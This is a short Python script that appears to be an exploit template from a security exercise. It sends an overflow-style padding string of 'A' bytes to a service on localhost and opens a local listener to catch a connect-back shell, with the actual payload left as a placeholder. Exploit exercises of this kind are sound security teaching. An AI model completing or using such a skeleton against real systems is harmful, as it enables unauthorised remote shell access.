#!/usr/bin/env python3

from struct import pack
from console import console

import socket
import sys
import time

if len(sys.argv) != 3:
    sys.exit("Usage: %s PORT CONNECT_PORT" % sys.argv[0])

port = int(sys.argv[1])
sock = socket.create_connection(('127.0.0.1', port))

port1 = int(sys.argv[2])

p = ("A"*29).encode('utf-8')

##
## Add your payload here.
##

sock1 = socket.socket()
sock1.bind(('127.0.0.1', port1))
sock1.listen(5)

init = "A"*1023
sock.sendall(init.encode('utf-8'))
time.sleep(1)
sock.sendall(p)

c, addr = sock1.accept()    
console(c)